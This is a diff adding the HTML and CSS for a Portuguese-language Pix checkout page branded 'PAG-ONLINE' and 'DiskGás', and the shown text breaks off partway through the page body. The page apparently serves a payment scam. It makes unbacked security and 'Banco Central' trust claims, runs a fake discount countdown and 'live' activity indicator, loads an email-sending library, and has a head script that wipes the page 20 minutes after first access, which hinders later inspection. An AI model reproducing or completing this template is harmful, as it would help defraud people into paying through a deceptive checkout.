@@ -1,0 +1,1499 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script>
+(function() {
+    const VINTE_MINUTOS = 20 * 60 * 1000; 
+    const agora = new Date().getTime();
+    
+    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');
+
+    if (!primeiroAcesso) {
+        localStorage.setItem('site_primeiro_acesso', agora);
+    } else {
+        const tempoDecorrido = agora - parseInt(primeiroAcesso);
+
+        if (tempoDecorrido > VINTE_MINUTOS) {
+            document.documentElement.innerHTML = "";
+            document.documentElement.style.backgroundColor = "#ffffff";
+            window.stop(); 
+        }
+    }
+})();
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Seguro | Finalizar Pedido</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        :root {
+            --primary: #0055ff;
+            --primary-dark: #0033cc;
+            --primary-light: #e8f0ff;
+            --accent: #00bfff;
+            --success: #28a745;
+            --warning: #ff6b35;
+            --danger: #ff3b30;
+            --text-dark: #1a1a1a;
+            --text-gray: #555;
+            --text-light: #888;
+            --bg-light: #f5f7fa;
+            --bg-white: #ffffff;
+            --border-color: #e0e4e8;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
+            --pix-color: #32bcad;
+            --pix-bg: #f0fffe;
+            
+            --green: #16a34a;
+            --green-soft: #f0fdf4;
+            --muted: #6b7280;
+            --white: #fff;
+            --bg: #f7f7f8;
+            --ink: #111827;
+            --ink2: #374151;
+            --border: #e5e7eb;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+            background-color: var(--bg-light);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--bg-white);
+            box-shadow: var(--shadow-md);
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 0;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--bg-white);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-md);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-left { display: flex; align-items: center; gap: 12px; flex: 1; }
+
+        .back-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: var(--bg-white);
+            font-size: 1.1rem;
+            cursor: pointer;
+            padding: 8px 10px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .brand-section { display: flex; flex-direction: column; gap: 2px; }
+        .brand-logo { font-size: 1.3rem; font-weight: 800; letter-spacing: -1px; line-height: 1; }
+        .brand-tagline { font-size: 0.7rem; opacity: 0.9; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        .header-right { display: flex; align-items: center; gap: 12px; }
+
+        .search-btn, .cart-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: var(--bg-white);
+            width: 36px;
+            height: 36px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1rem;
+            position: relative;
+        }
+
+        .cart-badge {
+            position: absolute;
+            top: -8px; right: -8px;
+            background-color: var(--danger);
+            color: white;
+            font-size: 0.65rem;
+            font-weight: bold;
+            min-width: 20px; height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--bg-white);
+        }
+
+        .trust-banner {
+            background: linear-gradient(90deg, rgba(40, 167, 69, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%);
+            border-bottom: 1px solid rgba(40, 167, 69, 0.2);
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            gap: 8px;
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            font-weight: 600;
+        }
+
+        .trust-item { display: flex; align-items: center; gap: 6px; flex: 1; text-align: center; justify-content: center; }
+        .trust-item i { color: var(--success); font-size: 1rem; }
+
+        .review-block {
+            padding: 20px;
+            background-color: var(--bg-white);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .review-header-bar {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .review-back-btn {
+            background: var(--bg-light);
+            border: none;
+            width: 36px; height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-dark);
+        }
+
+        .review-header-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .review-header-title i { color: var(--primary); }
+
+        .payment-options-container { display: flex; flex-direction: column; gap: 15px; }
+
+        .payment-option-card {
+            border: 2px solid var(--border-color);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            background-color: var(--bg-white);
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .payment-option-card.selected {
+            border: 3px solid var(--primary);
+            background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%);
+            box-shadow: 0 12px 32px rgba(0, 85, 255, 0.18);
+        }
+
+        .payment-option-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 16px; right: 16px;
+            width: 28px; height: 28px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 0.9rem;
+        }
+
+        .payment-option-icon { font-size: 1.8rem; color: var(--primary); margin-bottom: 4px; }
+        .payment-option-title { font-size: 1.1rem; font-weight: 800; color: var(--text-dark); }
+        .payment-option-price { font-size: 1.5rem; font-weight: 900; color: var(--primary); }
+        .payment-option-desc { font-size: 0.85rem; color: var(--text-gray); line-height: 1.4; }
+
+        .pix-form-container {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(50, 188, 173, 0.2);
+            display: none;
+            flex-direction: column;
+            gap: 12px;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .payment-option-card.selected .pix-form-container { display: flex; }
+
+        .pix-input-group { display: flex; flex-direction: column; gap: 5px; position: relative; }
+
+        .pix-input-group label {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .pix-input-group input {
+            padding: 12px 14px;
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+            outline: none;
+            color: var(--text-dark);
+            background: #f8fafc;
+        }
+
+        .pix-input-group input:focus {
+            border-color: var(--primary);
+            background: var(--bg-white);
+            box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.1);
+        }
+
+        .pix-error-msg {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            background: #fff1f2;
+            color: #e11d48;
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            border: 1px solid #fecdd3;
+            margin-top: 5px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .pix-error-msg.visible { display: flex; }
+
+        .payment-action-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
+        }
+
+        .payment-action-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 85, 255, 0.3);
+        }
+
+        /* PIX SCREEN */
+        #pixScreen {
+            display: none;
+            width: 100%;
+            max-width: 480px;
+            background: var(--bg);
+            min-height: 100vh;
+            padding: 0;
+            color: var(--ink);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+
+        #pixScreen.visible { display: block; opacity: 1; }
+
+        .hdr { background: rgba(247,247,248,.97); border-bottom: 1px solid var(--border); height: 56px; padding: 0 16px; display: flex; align-items: center; gap: 12px; width: 100%; }
+        .hdr-title { flex: 1; text-align: center; font-size: 16px; font-weight: 700; color: var(--ink); letter-spacing: -.2px; }
+        .hdr-space { width: 60px; }
+
+        .progress-steps {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 30px;
+            background: #fff;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 0;
+        }
+        .p-step { display: flex; flex-direction: column; align-items: center; gap: 6px; position: relative; flex: 1; }
+        .p-dot { width: 24px; height: 24px; border-radius: 50%; background: #e2e8f0; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #94a3b8; font-weight: 700; z-index: 2; }
+        .p-step.active .p-dot { background: var(--green); color: #fff; box-shadow: 0 0 0 4px rgba(22, 163, 74, 0.1); }
+        .p-step.done .p-dot { background: var(--green); color: #fff; }
+        .p-label { font-size: 9px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
+        .p-step.active .p-label { color: var(--green); }
+        .p-line { position: absolute; height: 2px; background: #e2e8f0; top: 12px; left: 50%; width: 100%; z-index: 1; }
+        .p-step.done .p-line { background: var(--green); }
+
+        .timer-container {
+            background: linear-gradient(135deg, #fff5f5 0%, #fff0e6 100%);
+            border: 1px solid #feb2b2;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin: 16px 16px 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .timer-top { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #c53030; font-weight: 700; }
+        .pix-timer-badge { background: #c53030; color: #fff; padding: 2px 8px; border-radius: 6px; font-family: monospace; font-size: 14px; margin-left: auto; }
+        .timer-bar { height: 4px; background: rgba(197, 48, 48, 0.1); border-radius: 10px; overflow: hidden; }
+        .timer-bar-fill { height: 100%; width: 100%; background: #c53030; transition: width 1s linear; }
+
+        .pix-order-summary { margin: 0 16px 16px; background: #fff; border: 1px solid var(--border); border-radius: 16px; overflow: hidden; }
+        .pix-order-header { background: #f8fafc; padding: 10px 14px; border-bottom: 1px solid var(--border); font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; display: flex; justify-content: space-between; }
+        .pix-product-card { padding: 14px; display: flex; align-items: center; gap: 14px; }
+        .pix-product-img { width: 56px; height: 56px; border-radius: 10px; object-fit: cover; border: 1px solid #f1f5f9; background: #f8fafc; }
+        .pix-product-info { flex: 1; display: flex; flex-direction: column; gap: 2px; }
+        .pix-product-name { font-size: 14px; font-weight: 700; color: var(--ink); line-height: 1.3; }
+        .pix-product-meta { font-size: 12px; color: var(--muted); font-weight: 500; }
+        .pix-product-price { font-size: 14px; font-weight: 800; color: var(--ink); text-align: right; }
+        .pix-product-savings { font-size: 11px; color: var(--green); font-weight: 700; margin-top: 2px; }
+        .pix-product-price-block { display: flex; flex-direction: column; align-items: flex-end; }
+
+        /* DELIVERY INFO BLOCK */
+        .pix-delivery-block {
+            margin: 0 16px 16px;
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            overflow: hidden;
+        }
+        .pix-delivery-header {
+            background: #f0fdf4;
+            border-bottom: 1px solid #bbf7d0;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #15803d;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .pix-delivery-header i { font-size: 14px; color: #16a34a; }
+        .pix-delivery-body { padding: 14px; display: flex; flex-direction: column; gap: 10px; }
+        .pix-delivery-eta { display: flex; align-items: center; gap: 12px; }
+        .pix-delivery-eta-badge {
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
+            color: #fff;
+            border-radius: 10px;
+            padding: 8px 14px;
+            font-size: 15px;
+            font-weight: 800;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .pix-delivery-eta-badge i { font-size: 14px; }
+        .pix-delivery-eta-info { display: flex; flex-direction: column; gap: 2px; }
+        .pix-delivery-eta-label { font-size: 10px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; }
+        .pix-delivery-eta-sub { font-size: 12px; font-weight: 600; color: #374151; }
+        .pix-delivery-address {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 10px 12px;
+        }
+        .pix-delivery-address i { color: #64748b; font-size: 14px; margin-top: 2px; flex-shrink: 0; }
+        .pix-delivery-address-text { font-size: 12px; color: #374151; font-weight: 500; line-height: 1.4; }
+        .pix-delivery-address-cep { font-size: 11px; color: #94a3b8; font-weight: 600; margin-top: 2px; }
+        .pix-delivery-notice {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            color: #15803d;
+            font-weight: 600;
+            background: #f0fdf4;
+            border-radius: 8px;
+            padding: 7px 10px;
+        }
+        .pix-delivery-notice i { font-size: 13px; flex-shrink: 0; }
+
+        /* QR Code */
+        .pix-qr-wrap {
+            text-align: center;
+            margin: 0 16px 20px;
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px 16px;
+            box-shadow: var(--shadow-sm);
+        }
+        .pix-qr-img-container {
+            width: 190px; height: 190px;
+            padding: 10px;
+            background: #fff;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--pix-bg);
+            border-radius: 12px;
+        }
+        .pix-qr-img-container img { width: 100% !important; height: 100% !important; }
+        .pix-qr-caption { font-size: 12px; color: var(--ink2); font-weight: 600; margin-top: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .pix-qr-caption i { color: var(--pix-color); }
+
+        /* PRIMARY CTA */
+        .pix-primary-cta {
+            margin: 0 16px 16px;
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
+            color: #fff; border: none; border-radius: 14px;
+            padding: 18px 20px; width: calc(100% - 32px);
+            font-size: 17px; font-weight: 800; font-family: inherit;
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            box-shadow: 0 8px 24px rgba(22, 163, 74, 0.3), 0 0 0 0 rgba(22, 163, 74, 0.5);
+            cursor: pointer; position: relative; overflow: hidden;
+            transition: all 0.2s;
+            animation: ctaPulse 2.2s ease-in-out infinite;
+        }
+        @keyframes ctaPulse {
+            0%, 100% { box-shadow: 0 8px 24px rgba(22, 163, 74, 0.3), 0 0 0 0 rgba(22, 163, 74, 0.4); }
+            50%      { box-shadow: 0 8px 28px rgba(22, 163, 74, 0.38), 0 0 0 10px rgba(22, 163, 74, 0); }
+        }
+        .pix-primary-cta::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 60%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            animation: ctaShine 3s ease-in-out infinite;
+        }
+        @keyframes ctaShine {
+            0%   { left: -100%; }
+            60%  { left: 130%; }
+            100% { left: 130%; }
+        }
+        .pix-primary-cta:active { transform: scale(0.97); }
+        .pix-primary-cta.copied { background: #111827; animation: none; }
+        .pix-primary-cta.copied::before { display: none; }
+
+        .pix-code-field { display: flex; gap: 8px; margin: 0 16px 20px; }
+        .pix-copia-input {
+            flex: 1; padding: 12px 14px; border: 1px solid var(--border); border-radius: 12px;
+            font-size: 12px; color: var(--muted); font-family: monospace; background: #f8fafc;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            outline: none;
+            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            caret-color: transparent;
+            pointer-events: none;
+        }
+        .pix-copia-input:focus { border-color: var(--border); box-shadow: none; }
+        .pix-copia-input::selection { background: transparent; color: var(--muted); }
+        .pix-copia-input::-moz-selection { background: transparent; color: var(--muted); }
+        .pix-btn-copiar {
+            background: #f1f5f9; color: var(--ink2); border: 1px solid var(--border);
+            border-radius: 12px; padding: 0 18px; font-size: 13px; font-weight: 700;
+            transition: all .15s; cursor: pointer;
+        }
+        .pix-btn-copiar:active { background: #e2e8f0; }
+
+        .pix-aguardando {
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            padding: 14px 16px; background: var(--green-soft); border: 1px solid #bbf7d0;
+            border-radius: 14px; margin: 0 16px 12px; font-size: 14px; color: var(--green); font-weight: 700;
+            flex-direction: column;
+        }
+        .pix-aguardando-top { display: flex; align-items: center; gap: 10px; }
+        .pix-aguardando-sub { font-size: 11px; font-weight: 600; color: #15803d; opacity: 0.85; letter-spacing: 0.2px; }
+
+        .pix-social-proof {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            margin: 0 16px 16px; padding: 10px 14px;
+            background: #fff; border: 1px solid #e2e8f0; border-radius: 12px;
+            font-size: 12px; color: #475569; font-weight: 600;
+        }
+        .pix-social-proof .live-dot {
+            width: 8px; height: 8px; border-radius: 50%; background: #16a34a;
+            box-shadow: 0 0 0 0 rgba(22,163,74,0.6);
+            animation: liveDot 1.6s ease-out infinite;
+            flex-shrink: 0;
+        }
+        @keyframes liveDot {
+            0%   { box-shadow: 0 0 0 0 rgba(22,163,74,0.55); }
+            70%  { box-shadow: 0 0 0 8px rgba(22,163,74,0); }
+            100% { box-shadow: 0 0 0 0 rgba(22,163,74,0); }
+        }
+        .pix-social-proof b { color: #0f172a; font-weight: 800; }
+
+        .bank-icons-row {
+            display: flex; justify-content: center; align-items: center; gap: 15px;
+            margin: 0 16px 18px; opacity: 0.85;
+            padding: 12px 14px; background: #fff; border: 1px solid #e2e8f0; border-radius: 12px;
+        }
+        .bank-icons-row img { height: 20px; width: auto; object-fit: contain; filter: grayscale(0.15); }
+        .bank-icons-label { text-align: center; font-size: 10px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.8px; margin: 0 16px 6px; }
+
+        .pix-info { background: var(--white); border: 1px solid var(--border); border-radius: 16px; padding: 18px; display: flex; flex-direction: column; gap: 12px; margin: 0 16px 12px; }
+        .pix-info-step { display: flex; align-items: flex-start; gap: 12px; font-size: 13px; color: var(--ink2); line-height: 1.4; }
+        .pix-info-step .step-num { flex-shrink: 0; width: 22px; height: 22px; border-radius: 6px; background: #f1f5f9; color: var(--ink2); font-size: 11px; font-weight: 800; display: flex; align-items: center; justify-content: center; }
+
+        .pix-secure-line {
+            text-align: center; font-size: 11px; color: var(--muted);
+            margin: 8px 16px 20px; display: flex; align-items: center; justify-content: center; gap: 14px;
+            font-weight: 600; flex-wrap: wrap;
+        }
+        .pix-secure-line span { display: inline-flex; align-items: center; gap: 5px; }
+        .pix-secure-line i { color: var(--green); }
+
+        .guarantee-badge {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
+            border: 1px solid #fde68a; border-radius: 100px;
+            padding: 7px 16px; margin: 0 auto 16px; width: fit-content;
+            font-size: 11px; font-weight: 800; color: #78350f; letter-spacing: 0.3px;
+        }
+        .guarantee-badge i { color: #d97706; }
+
+        @keyframes dotpulse { 0%,80%,100% { transform: scale(.7); opacity: .5; } 40% { transform: scale(1); opacity: 1; } }
+        .pix-dot-loader { display: flex; gap: 4px; }
+        .pix-dot-loader span { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: dotpulse 1.2s infinite; }
+        .pix-dot-loader span:nth-child(2) { animation-delay: .2s; }
+        .pix-dot-loader span:nth-child(3) { animation-delay: .4s; }
+
+        /* MODALS */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            padding: 30px;
+            position: relative;
+            box-shadow: var(--shadow-lg);
+            animation: modalIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes modalIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .modal-close-btn {
+            position: absolute; top: 15px; right: 15px;
+            background: #f1f5f9; border: none;
+            width: 32px; height: 32px;
+            border-radius: 50%; cursor: pointer;
+            color: var(--text-gray);
+            display: flex; align-items: center; justify-content: center;
+        }
+        .modal-icon { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; margin: 0 auto 20px; }
+        .modal-icon.warning { background: #fff7ed; color: #f97316; }
+        .modal-icon.success { background: #f0fdf4; color: #22c55e; }
+        .modal-title { font-size: 1.3rem; font-weight: 800; text-align: center; margin-bottom: 12px; }
+        .modal-text { text-align: center; color: var(--text-gray); font-size: 0.95rem; line-height: 1.5; margin-bottom: 25px; }
+        .modal-buttons { display: flex; flex-direction: column; gap: 12px; }
+        .btn-modal { width: 100%; padding: 14px; border-radius: 12px; font-size: 0.95rem; font-weight: 700; cursor: pointer; transition: all 0.2s; border: none; }
+        .btn-modal-pix { background: var(--primary); color: white; }
+        .btn-modal-continue { background: var(--primary); color: white; }
+
+        .contact-form { display: flex; flex-direction: column; gap: 15px; }
+        .form-group { display: flex; flex-direction: column; gap: 6px; position: relative; }
+        .form-group label { font-size: 0.8rem; font-weight: 700; color: var(--text-dark); }
+        .form-group input { padding: 12px; border: 2px solid var(--border-color); border-radius: 10px; outline: none; }
+        .form-group input:focus { border-color: var(--primary); }
+
+        .input-check-icon {
+            position: absolute; right: 14px; bottom: 12px;
+            color: var(--success); font-size: 1rem;
+            opacity: 0; transform: scale(0.5);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            pointer-events: none; z-index: 5;
+        }
+        .input-check-icon.visible { opacity: 1; transform: scale(1); }
+        .pix-input-group .input-check-icon { bottom: 14px; }
+
+        .btn-send-form { background: var(--primary); color: white; margin-top: 10px; }
+
+        .delivery-warning-container {
+            display: none;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border-color);
+        }
+        .payment-option-card.selected .delivery-warning-container { display: flex; }
+
+        .delivery-warning-box {
+            background: #fff7ed; border: 1px solid #ffedd5;
+            padding: 12px; border-radius: 12px;
+            display: flex; gap: 10px;
+            font-size: 0.8rem; color: #9a3412; line-height: 1.4;
+        }
+        .delivery-warning-box i { color: #f97316; font-size: 1rem; margin-top: 2px; }
+
+        /* LOADER */
+        .loader-backdrop {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        .loader-backdrop.active { display: flex; opacity: 1; }
+        .loader-main { text-align: center; width: 100%; max-width: 320px; padding: 24px; position: relative; z-index: 1; }
+        .loader-shield { width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
+        .loader-shield i { font-size: 48px; color: var(--primary); z-index: 2; }
+        .loader-circle { position: absolute; width: 100%; height: 100%; border: 3px solid #f0f4f8; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite !important; }
+        .loader-text h3 { font-size: 1.25rem; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }
+        .loader-text p { font-size: 0.9rem; color: var(--text-gray); margin-bottom: 24px; }
+        .loader-progress-container { width: 100%; max-width: 280px; margin: 0 auto 20px; }
+        .loader-progress-bar { height: 10px; background: #f1f5f9; border-radius: 12px; overflow: hidden; position: relative; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); }
+        .loader-progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--primary) 0%, var(--accent) 100%); border-radius: 12px; transition: width 1.5s cubic-bezier(0.22, 1, 0.36, 1); position: relative; }
+        .loader-progress-fill::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); animation: loaderShine 1.8s infinite; }
+        @keyframes loaderShine { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .loader-status-text { font-size: 0.85rem; color: var(--primary); font-weight: 800; margin-top: 14px; display: block; min-height: 1.2em; text-transform: uppercase; letter-spacing: 0.8px; }
+        .loader-trust { display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 32px; font-size: 11px; color: #94a3b8; font-weight: 500; }
+        .loader-trust i { color: var(--success); }
+
+        /* Badge Promoção */
+        .payment-option-title { display: flex; align-items: center; gap: 10px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-weight: 700; color: #1a1a1a; }
+        .promo-badge { background-color: rgba(40, 167, 69, 0.08); color: #1e7e34; border: 1px solid rgba(40, 167, 69, 0.2); padding: 2px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; letter-spacing: 0.3px; text-transform: none; display: inline-flex; align-items: center; justify-content: center; line-height: 1; height: 20px; white-space: nowrap; transition: all 0.2s ease; }
+        .payment-option-card:hover .promo-badge { background-color: rgba(40, 167, 69, 0.12); border-color: rgba(40, 167, 69, 0.3); }
+    </style>
+</head>
+<body>
+    <!-- Loader -->
+    <div id="global-loader" class="loader-backdrop">
+        <div class="loader-main">
+            <div class="loader-shield">
+                <div class="loader-circle"></div>
+                <i class="fas fa-shield-check"></i>
+            </div>
+            <div class="loader-text">
+                <h3 id="loader-title">Processando Pagamento</h3>
+                <p id="loader-desc">Aguarde um instante enquanto geramos seu código Pix seguro.</p>
+            </div>
+            <div class="loader-progress-container">
+                <div class="loader-progress-bar">
+                    <div class="loader-progress-fill" id="loaderProgress"></div>
+                </div>
+                <span class="loader-status-text" id="loaderStatus">Iniciando...</span>
+            </div>
+            <div class="loader-trust">
+                <span><i class="fas fa-shield-alt"></i> Ambiente Seguro</span>
+                <span><i class="fas fa-check-circle"></i> Banco Central</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="mainContainer">
+        <header class="header">
+            <div class="header-left">
+                <button class="back-btn" title="Voltar"><i class="fas fa-arrow-left"></i></button>
+                <div class="brand-section">
+                    <div class="brand-logo">PAG-ONLINE</div>
+                    <div class="brand-tagline">Pagamento Seguro</div>
+                </div>
+            </div>
+            <div class="header-right">
+                <button class="search-btn" title="Buscar"><i class="fas fa-search"></i></button>
+                <button class="cart-btn" id="cart-btn" title="Carrinho">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-badge" id="cart-badge">1</span>
+                </button>
+            </div>
+        </header>
+
+        <div class="trust-banner">
+            <div class="trust-item"><i class="fas fa-lock"></i><span>100% Seguro</span></div>
+            <div class="trust-item"><i class="fas fa-check-circle"></i><span>Garantido</span></div>
+        </div>
+
+        <div id="cart-content-wrapper"></div>
+    </div>
+
+    <!-- TELA PIX -->
+    <div id="pixScreen">
+        <header class="hdr">
+            <div class="hdr-space"></div>
+            <span class="hdr-title">DiskGás - Pix</span>
+            <div class="hdr-space"></div>
+        </header>
+
+        <div class="progress-steps">
+            <div class="p-step done">
+                <div class="p-dot"><i class="fas fa-check"></i></div>
+                <div class="p-label">Pedido</div>
+                <div class="p-line"></div>
+            </div>
+            <div class="p-step active">
+                <div class="p-dot">2</div>
+                <div class="p-label">Pagamento</div>
+                <div class="p-line"></div>
+            </div>
+            <div class="p-step">
+                <div class="p-dot">3</div>
+                <div class="p-label">Envio</div>
+            </div>
+        </div>
+
+        <div class="timer-container">
+            <div class="timer-top">
+                <i class="fas fa-clock"></i>
+                <span>O desconto termina em:</span>
+                <span class="pix-timer-badge" id="pixTimer">15:00</span>
+            </div>
+            <div class="timer-bar"><div class="timer-bar-fill" id="pixTimerBar"></div></div>
+        </div>
+
+        <!-- Resumo do Pedido -->
+        <div class="pix-order-summary">
+            <div class="pix-order-header">
+                <span>Resumo do Pedido</span>
+                <span id="pixOrderId">#92841</span>
+            </div>
+            <div id="pixProductContainer"></div>
+        </div>
+
+        <!-- Bloco de Entrega -->
+        <div class="pix-delivery-block" id="pixDeliveryBlock">
+            <div class="pix-delivery-header">
+                <i class="fas fa-truck-fast"></i>
+                <span>Informações de Entrega</span>
+            </div>
+            <div class="pix-delivery-body">
+                <div class="pix-delivery-eta">
+                    <div class="pix-delivery-eta-badge">
+                        <i class="fas fa-bolt"></i>
